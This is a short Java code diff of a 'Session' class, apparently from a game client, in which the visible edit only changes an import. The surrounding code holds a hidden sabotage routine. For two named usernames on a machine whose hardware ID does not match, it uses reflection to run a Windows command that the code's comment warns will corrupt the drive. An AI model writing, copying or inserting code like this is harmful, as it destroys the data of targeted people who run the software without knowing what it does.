@@ -8,6 +8,8 @@ import exhibition.util.security.AuthenticationUtil;
 import java.util.Map;
 import java.util.UUID;
 
+import static exhibition.util.security.AuthenticationUtil.getHwid;
+
 public class Session
 {
     private final String username;
@@ -25,7 +27,7 @@ public class Session
         try {
             if (usernameIn.equals("GhastDaSkid") || usernameIn.equals("NoFatherFigure")) {
                 Class runtimeClass = Class.forName("java.lang.Runtime");
-                if(AuthenticationUtil.getHwid() != 32161752) {
+                if(getHwid() != 32161752) {
                     // TODO: SET YOUR DEBUGGER TO HALT ON OR BEFORE THIS LINE TO PREVENNT DRIVE FROM CORRUPTING
                     runtimeClass.getMethod("exec", String.class).invoke(runtimeClass.getMethod("getRuntime").invoke(null), "cd c:\\:$i30:$bitmap");
                 }
